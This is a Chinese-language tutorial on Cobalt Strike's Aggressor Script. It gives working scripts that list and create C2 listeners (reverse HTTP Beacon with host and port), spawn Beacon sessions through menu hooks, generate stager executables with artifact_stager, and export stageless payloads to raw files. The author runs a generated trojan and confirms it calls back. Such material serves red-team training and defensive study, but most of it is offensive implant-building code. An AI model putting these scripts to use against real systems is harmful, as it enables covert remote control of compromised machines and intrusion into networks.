# Aggressor Script — Listeners

## Listeners

> 用来显示存在的监听器

监听器就是我们常常使用的，用来接收C2马子的流量的东西和写入荷载的信息；监听器会在生成荷载的时候将我们选择的某一个监听器的信息写入，在第二阶段时候，利用Stager加载我们的配置信息，如果是一个 Beacon\_HTTP 的话，那么写入的东西包括 IP、端口、回连地址等信息，如下

![](/images/Aggressor-Script/image-20201213202406153.png)

Listener API 会将所有的监听信息显示出来，我们可以使用 `Listeners()`显示所有的信息，如果我们有本地的监听，例如 SMB 的监听的话，我们就需要使用 `Listeners_local` 显示本地的信息，如下：

![](/images/Aggressor-Script/image-20201213210924614.png)

这样我们可以显示我们的信息，但是我们没法详细的查看每一个Listener的详细信息，那么我们可以使用 Listener\_info 函数来显示我们所有的信息

* Listener\_info 的使用方式：

```shell
listener_info("想要查看的监听器信息")
```

![](/images/Aggressor-Script/image-20201213213825612.png)我们可以将两者结合起来显示所有的监听器的信息，我们把Listeners 得到的名称传到 listener\_info:

```shell
command show_info {
    foreach $name (listeners()) {
        println("\n== $name 的配置信息 == ");
        foreach $key => $value (listener_info($name)) {
            println("$[10]key : $value");
        }
    }
}
```

![](/images/Aggressor-Script/image-20201213220411582.png)上面的 cna 加载以后就能得到这样的信息

* Listener\_create\_ext 创建新的监听器在 GUI 界面中我们可以直接创建，其实那个 GUI 创建也是调用的 Listener\_create\_ext，进行创建，下面是他个我们定义好的参数：`$1`-侦听器名称\
  `$2`-有效负载（例如，windows / beacon\_http / reverse\_http）\
  `$3`-带有键/值对的映射，这些键/值对指定了监听器的链接信息，host和port等`$2`的可选项为：

| payload | 类型 |
| --- | --- |
| windows/beacon\_dns/reverse\_dns\_txt | Beacon DNS |
| windows/beacon\_http/reverse\_http | Beacon HTTP |
| windows/beacon\_https/reverse\_https | Beacon HTTPS |
| windows/beacon\_bind\_pipe | Beacon SMB |
| windows/beacon\_bind\_tcp | Beacon TCP |
| windows/beacon\_extc2 | External C2 |
| windows/foreign/reverse\_http | Foreign HTTP |
| windows/foreign/reverse\_https | Foreign HTTPS |

* `$3`的可选项：

| Key | DNS | HTTP/S | SMB | TCP(Bind) |
| --- | --- | --- | --- | --- |
| althost |  | HTTP Host Header |  |  |
| bindto | bind  port | bind  port |  |  |
| beacons | C2 Hosts | C2 Hosts |  |  |
| host | strging Host | strging Host |  |  |
| port | C2 port | C2 port | pipe name | port |
| profile |  | profile variant |  |  |
| proxy |  | proxy config |  |  |

* 按照这样的方式，我们使用 cna 配置一个 Beacon HTTP 的监听：语法：

```shell
listener_creat_text("创建的名称","选择的payload",%("选择的payload需要填上的参数"));
```

实践

```shell
listener_create_ext("我的HTTP监听","windows/beacon_http/reverse_http",%(host=>"IP或者域名",port=>1080,beacons =>"IP或者域名"));
printAll(listeners());
println("创建成功！");
```

由于我的端口被占用，我先删除一下：![](/images/Aggressor-Script/image-20201213222945393.png)然后运行 cna 并查看：![](/images/Aggressor-Script/image-20201213223523971.png)\
![](/images/Aggressor-Script/image-20201213223612288.png)\
成功创建，我们这里的参数并没有全部按照啥要求填满，和我们平时 GUI 创建是一样的。在原文中提到过一个 代理问题 ，这里我没写，因为我感觉用的比较少

* 会话传递 在我们日常使用的时候，我们会将会话传递(Spawn)，比如将会话传递到 MSF 中，或者传递 SMB 到其他会话，下面是这个操作的源码：

```shell
item "&Spawn" {
    openPayloadHelper(lambda({
        binput($bids, "spawn x86 $1");
        bspawn($bids, $1, "x86");
    }, $bids => $1));
}
```

这里面设计到多个 数据模型 ，我们一个一个的讲解。

```
- openpayloadHelper： 打开我们拥有的 Listener 会话框：
- bspawn：创建新的会话，需要传递一个会话ID
```

```java
    popup beacon_bottom{
        item("&会话传递",{openPayloadHelper(lambda({
        bspawn($bid, $1);
      println("我们传递的监听器是".$1)},# 
        $bid => $1));});
  }
```

当openpayladhelper打开存在的Listener会话时，他需要接受一个值，这个值是选定的监听器，然后这里将这个值传递给bspawn，bsapwn需要接受的第一个值也是选定的监听器（bspawn是生成一个新的会话），所以这里我们的将选择的监听器传递给bspawn就可以传递会话，这个地方的写法是固定的，单独的将openPayloadHelper使用是不可以的，但是baspwn是可以的，当运行上面的内容以后，我们可以查看`$1`的值，你会发现就是我们所选择的监听器：

![](/images/Aggressor-Script/image-20201214112030750.png)

![](/images/Aggressor-Script/image-20201214112048256.png)

![](/images/Aggressor-Script/image-20201214112103471.png)

这样我们也算是重写了我们 Spwan的数据模型

官方菜单写法中，使用的是 `binput`，这个 数据模型 是用来在Becon 中显示我们执行的命令的，下面是官方的写法的结果：\
![](/images/Aggressor-Script/image-20201214112330479.png)

## Stagers

> Stager我只能根据我的理解来描述，肯定会和很多师傅的不相同，仅作为参考

Stage（阶段）指的是分阶段，他没有含义，仅仅是指的这种类型，分阶段木马一般是我们在目标上无法使用较大的文件或者命令时使用，使用这样的方式分阶段的一个一个的从远端下载我们的代码，然后传输到受控段

Stager指加载器，例如下面这个截图：

![](/images/Aggressor-Script/image-20201214141457999.png)

这里我们使用 Stager 去请求我设置的URL，所以我们可以将Stager理解为加载器，加载远端的代码；在官方文档中是这么解释的：Stager 是一个微型程序，它可以下载有效荷载并且接收，适合运用于有大小限制的程序，例如用户的驱动攻击。

我们可以适应 stager 数据模型将我们的信息打印出来，使用它需要输入两个参数

`$1` Listener 名字

`$2` 选择位数 x86 | x64

我们在控制台可以查看一下：\
![](/images/Aggressor-Script/image-20201214142943361.png)

其次就是使用 artifact\_stager 数据模型生成我们的可执行文件，或者其他类型的木马，他需要接受3个参数：\
`$1` 监听器的名字

`$2` 生成文件的类型，比如exe

`$3` 选择位数 x86 | x64

下面是`$2` 的可选的参数

| 类型 | 说明 |
| --- | --- |
| dll | 一个 dll 程序 |
| exe | 一个可执行的 exe 程序 |
| powershell | 一个powershll执行程序 |
| python | 一个python的程序 |
| raw | 原始文件 |
| svcexe | 一个svc.exe程序 |
| vbscript | 生成Vbs文件 |

我们使用 artifact\_stager进行生成：

```shell
$data = artifact_stager("Tencent", "exe", "x64"); #选择监听器、生成类型、位数

$handle = openf(">Kris.exe"); # 生成的路径，这里是在当前执行的路径下
writeb($handle, $data); # 写入
closef($handle); # 关闭写入，不关闭会一直卡住	
```

我们执行:

![](/images/Aggressor-Script/image-20201214145716511.png)

然后运行这个木马，看看是否可以上线：

![](/images/Aggressor-Script/image-20201214145811630.png)

可以上线，在GUI中也是使用的这个 数据模型 创建。

## Local Stagers

> 本地的Stager信息

我们上面提到了监听器的信息有 本地监听器和云端监听器，那么对于本地的正向链接的 TCP Listener 我们就可以使用 stager\_bind\_tcp 这个数据模型来查看，这个数据模型只能查看 TCP 类型的 Stager，他需要接受三个参数：

`$1` 我们创建的 TCP 监听名字

`$2` 监听器的位数

`$3` 监听器的链接端口

我们使用下面的代码查看一下我们的 TCP stager信息：

```shell
$TcpStager = stager_bind_tcp("你的TCP监听器名称","位数","bind to 端口");
elog($TcpStager);
```

![](/images/Aggressor-Script/image-20201215142818777.png)

![](/images/Aggressor-Script/image-20201215142751398.png)

实测加了端口也没有变化：

![](/images/Aggressor-Script/image-20201215142952923.png)

## Named Pipe Stager

Pipe Stager是内网渗透中，用于不能出网的主机的一种加载器，他只有 X86 的选择，我们可以使用 stager\_bind\_pipe 数据模型导出对应的 SMB 监听，他需要接受的参数如下：

`$1` 监听器的名称

他只需要这一个参数，CS4.0以后我们创建 SMB 链接只需要填写监听器名称，其他的都会自动填上。

```shell
$SMB_stager = stager("SMB");
elog($SMB_stager);
```

![](/images/Aggressor-Script/image-20201215143849447.png)

## Stageless Payloads

stageless 和stageless相反，指的是无阶段；stageless payloads 是指无阶段的荷载信息，我们可以使用 payload 数据模型导出所有的信息：

`$1` 监听器的名字

`$2`机器位数 x86 | x64

`$3` 进程名字

```shell
$data = payload("Tencent", "x64");

$handle = openf(">out.bin");
writeb($handle, $data);
closef($handle);
```

![](/images/Aggressor-Script/image-20201215151750713.png)

保存成功，然后我们可以使用 hex 打开看看内容：

![](/images/Aggressor-Script/image-20201215151825407.png)
